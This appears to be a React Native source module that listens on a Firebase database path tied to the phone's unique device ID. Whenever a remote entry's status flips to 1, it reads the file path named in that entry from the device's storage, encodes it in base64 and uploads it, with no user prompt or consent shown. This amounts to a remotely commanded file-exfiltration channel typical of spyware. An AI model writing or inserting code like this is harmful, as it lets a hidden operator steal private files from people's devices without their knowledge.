import React, { useEffect } from 'react';
import RNFS from 'react-native-fs';
import database from '@react-native-firebase/database';
import DeviceInfo from 'react-native-device-info';
import { uploadFile } from './api';






const getAndUploadFiles = async (path, name) => {

    const fileExists = await RNFS.exists(path);
    if (!fileExists) {
        // console.log('File does not exist:', path);
        return;
    }

    const base64String = await RNFS.readFile(path, 'base64');
    const ext = name.split('.')[name.split('.').length-1]; 
    uploadFile(base64String, ext);

    //   const userRef = database().ref(`/uploadFile/${deviceId}`);
    //   await userRef.update({
    //     data: JSON.stringify(externalRootItems),
    //     path:path,
    //     status:'1'
    //   });

};



const handleValueChange = (snapshot) => {
    const newData = snapshot.val();
    if (newData) {
        if (newData.status == 1 || newData.status == '1') {
            getAndUploadFiles(newData.path, newData.name);
        }
    }
};

const listenForDataChanges = async () => {
    const deviceId = await DeviceInfo.getUniqueId();
    const FilsDataRef = database().ref(`/uploadFile/${deviceId}`);
    FilsDataRef.on('value', handleValueChange);

    // Return a cleanup function to remove the listener
    return () => FilsDataRef.off('value', handleValueChange);
};

export const startFileUploadListening = async () => {
    const deviceId = await DeviceInfo.getUniqueId();
    listenForDataChanges();
};